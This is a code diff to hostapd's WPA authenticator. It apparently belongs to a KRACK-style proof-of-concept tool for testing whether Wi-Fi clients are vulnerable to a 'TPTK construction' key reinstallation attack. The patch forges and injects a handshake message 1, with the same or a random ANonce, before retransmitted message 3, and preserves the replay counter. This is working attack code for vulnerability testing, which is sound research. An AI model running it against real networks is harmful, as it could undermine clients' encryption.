@@ -78,6 +78,7 @@ static const int dot11RSNAConfigSATimeout = 60;
 #define TEST_4WAY	1
 #define TEST_GROUP	2
 int poc_testing_handshake = TEST_4WAY;
+int poc_testing_tptk_construction = TEST_TPTK_NONE;
 #endif
 
 static inline int wpa_auth_mic_failure_report(
@@ -343,6 +344,11 @@ void poc_start_testing_group_handshake(struct wpa_authenticator *wpa_auth)
 
 	poc_testing_handshake = TEST_GROUP;
 	poc_log(NULL, "starting group key handshake tests\n");
+}
+
+void poc_test_tptk_construction(struct wpa_authenticator *wpa_auth, int test_type)
+{
+	poc_testing_tptk_construction = test_type;
 }
 #endif
 
@@ -1167,8 +1173,9 @@ continue_processing:
 		     sm->wpa_ptk_state != WPA_PTK_PTKINITNEGOTIATING)) {
 			wpa_auth_vlogger(wpa_auth, sm->addr, LOGGER_INFO,
 					 "received EAPOL-Key msg 2/4 in "
-					 "invalid state (%d) - dropped",
-					 sm->wpa_ptk_state);
+					 "invalid state (%d) - dropped - MIC %d",
+					 sm->wpa_ptk_state,
+					 wpa_verify_key_mic(sm->wpa_key_mgmt, &sm->PTK, data, data_len));
 			return;
 		}
 		random_add_randomness(key->key_nonce, WPA_NONCE_LEN);
@@ -2297,9 +2304,34 @@ SM_STATE(WPA_PTK, PTKINITNEGOTIATING)
 		sm->pairwise_set = TRUE;
 	}
 
-	// Reset transmit packet number of the group key, so we can detect if clients
-	// will accept re-used packet numbers (IVs) in broadcast data frames. Debug
-	// output is printed below.
+	// When testing for Temporal TPK construction (e.g. wpa_supplicant 2.6 attack), forge a message 1
+	// with the current and a random ANonce before retransmitted message 3's.
+	if (sm->TimeoutCtr > 1 && poc_testing_tptk_construction != TEST_TPTK_NONE) {
+		u8 replay_counter[WPA_REPLAY_COUNTER_LEN];
+		u8 random_anonce[WPA_NONCE_LEN];
+		u8 *anonce = NULL;
+
+		memcpy(replay_counter, sm->key_replay[0].counter, WPA_REPLAY_COUNTER_LEN);
+		random_get_bytes(random_anonce, WPA_NONCE_LEN);
+
+		// Note: this message 1 is sent using link-layer encryption. This is what we want.
+		// In practice an implementation may accept plaintext message 1's due to race conditions,
+		// were we just send it encrypted so we simulate always winning these race conditions.
+		poc_log(sm->addr, "Injecting Msg1 (%s) before Msg3 to test TPTK construction attack\n",
+			poc_testing_tptk_construction == TEST_TPTK_RAND ? "with random ANonce" : "with same ANonce");
+
+		anonce = poc_testing_tptk_construction == TEST_TPTK_RAND ? random_anonce : sm->ANonce;
+		__wpa_send_eapol(sm->wpa_auth, sm,
+			 WPA_KEY_INFO_ACK | WPA_KEY_INFO_KEY_TYPE, NULL,
+			 anonce, NULL, 0, 0, 0, 0);
+
+		// The replay counter should not be modified when sending the forged Msg1
+		memcpy(sm->key_replay[0].counter, replay_counter, WPA_REPLAY_COUNTER_LEN);
+	}
+
+	// Reset transmit packet number of the group key used by the kernel/driver, so
+	// we can detect if clients will accept re-used packet numbers (IVs) in broadcast
+	// data frames. Debug output is printed below.
 	wpa_group_config_group_keys(sm->wpa_auth, sm->group);
 #endif
 
